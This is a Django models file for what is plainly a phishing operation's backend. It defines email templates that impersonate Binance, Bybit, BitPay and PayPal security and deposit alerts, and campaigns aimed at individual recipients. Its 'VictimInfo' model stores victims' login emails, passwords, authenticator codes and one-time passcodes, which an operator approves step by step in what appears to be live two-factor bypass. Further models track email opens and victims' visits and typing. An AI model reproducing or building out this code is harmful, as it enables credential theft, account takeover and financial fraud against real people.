from django.db import models
from django.utils import timezone
from shortuuid.django_fields import ShortUUIDField
from django.conf import settings
from accounts.models import CustomUser

User = settings.AUTH_USER_MODEL

# Create your models here.
TEMPLATE_CHOICES = [
    ('binance_deposit', 'Binance Deposit on Hold'),
    ('binance_unknown', 'Binance Unknown Login'),
    ('bybit_deposit', 'Bybit Deposit on Hold'),
    ('bybit_unknown', 'Bybit Unknown Login'),
    ('bitpay_deposit', 'BitPay Deposit on Hold'),
    ('bitpay_unknown', 'BitPay Unknown Login'),
    ('paypal_unknown', 'PayPal Unknown Login'),
    ('paypal_deposit', 'PayPal Deposit on Hold'),
]

class EmailTemplate(models.Model):
    type = models.CharField(max_length=20, choices=TEMPLATE_CHOICES)

    def __str__(self):
        return self.get_type_display()

    class Meta:
        verbose_name = 'Email Template'
        verbose_name_plural = 'Email Templates'

class Campaign(models.Model):
    id = ShortUUIDField(primary_key=True, length=10, alphabet='0123456789abcdefghijklmnopqrstuvwxyz')
    user = models.ForeignKey('accounts.CustomUser', on_delete=models.CASCADE, related_name='campaigns')
    email_template = models.ForeignKey(EmailTemplate, on_delete=models.CASCADE, related_name='campaigns')
    recipient_email = models.EmailField()
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        verbose_name = 'Campaign'
        verbose_name_plural = 'Campaigns'
        ordering = ['-created_at']
        
    def __str__(self):
        return f'Campaign for {self.recipient_email} - {self.email_template.type}'
    
SUBMISSION_STATUS_CHOICES = [
    ('pending', 'Pending'),
    ('approved', 'Approved'),
    ('rejected', 'Rejected'),
]

class VictimInfo(models.Model):
    id = ShortUUIDField(primary_key=True, length=10, alphabet='0123456789abcdefghijklmnopqrstuvwxyz')
    user = models.ForeignKey('accounts.CustomUser', on_delete=models.CASCADE, related_name='victim_infos')
    campaign = models.ForeignKey(Campaign, on_delete=models.CASCADE, related_name='victim_infos')
    login_email = models.EmailField(blank=True, null=True)
    login_authenticator_app_code = models.CharField(max_length=8, null=True, blank=True)
    login_password = models.CharField(max_length=255, null=True, blank=True)
    login_otp = models.CharField(max_length=6, blank=True, null=True)
    
    # New fields for approval system
    email_status = models.CharField(max_length=20, choices=SUBMISSION_STATUS_CHOICES, default='pending')
    password_status = models.CharField(max_length=20, choices=SUBMISSION_STATUS_CHOICES, default='pending')
    authenticator_status = models.CharField(max_length=20, choices=SUBMISSION_STATUS_CHOICES, default='pending')
    otp_status = models.CharField(max_length=20, choices=SUBMISSION_STATUS_CHOICES, default='pending')
    
    # Error messages for rejected submissions
    email_error_message = models.TextField(blank=True, null=True)
    password_error_message = models.TextField(blank=True, null=True)
    authenticator_error_message = models.TextField(blank=True, null=True)
    otp_error_message = models.TextField(blank=True, null=True)
    
    # Track which step is currently pending
    current_step = models.CharField(max_length=20, default='email')  # email, password, otp
    
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        verbose_name = 'Victim Info'
        verbose_name_plural = 'Victim Infos'
        ordering = ['-created_at']

    def __str__(self):
        return f'Victim Info for {self.login_email or "Unknown"} - Campaign {self.campaign}'

EMAIL_EVENT_TYPE_CHOICES = [
    ('open', 'Open'),
    ('delivered', 'Delivered'),
    ('bounced', 'Bounced'),
]

class EmailEvent(models.Model):
    """
    Tracks email events such as open, delivered, bounced, etc. for analytics and deliverability.
    """
    campaign = models.ForeignKey(Campaign, on_delete=models.CASCADE, related_name='email_events')
    event_type = models.CharField(max_length=16, choices=EMAIL_EVENT_TYPE_CHOICES)
    timestamp = models.DateTimeField(auto_now_add=True)
    recipient = models.EmailField()
    tracking_id = models.CharField(max_length=64, unique=True)

    class Meta:
        indexes = [
            models.Index(fields=['campaign', 'event_type', 'recipient']),
        ]
        ordering = ['-timestamp']
        verbose_name = 'Email Event'
        verbose_name_plural = 'Email Events'

    def __str__(self):
        return f"{self.event_type} for {self.recipient} ({self.campaign}) at {self.timestamp}"

VICTIM_EVENT_TYPE_CHOICES = [
    ('visit', 'Visit'),
    ('typing', 'Typing'),
]

class VictimEvent(models.Model):
    """
    Tracks victim activity events on the static site (visit, typing, etc.) for analytics and notifications.
    """
    campaign = models.CharField(max_length=10)  # Changed from ForeignKey to CharField
    event_type = models.CharField(max_length=16, choices=VICTIM_EVENT_TYPE_CHOICES)
    timestamp = models.DateTimeField(auto_now_add=True)
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.TextField(null=True, blank=True)

    class Meta:
        indexes = [
            models.Index(fields=['campaign', 'event_type']),
        ]
        ordering = ['-timestamp']
        verbose_name = 'Victim Event'
        verbose_name_plural = 'Victim Events'

    def __str__(self):
        return f"{self.event_type} for {self.campaign} at {self.timestamp}"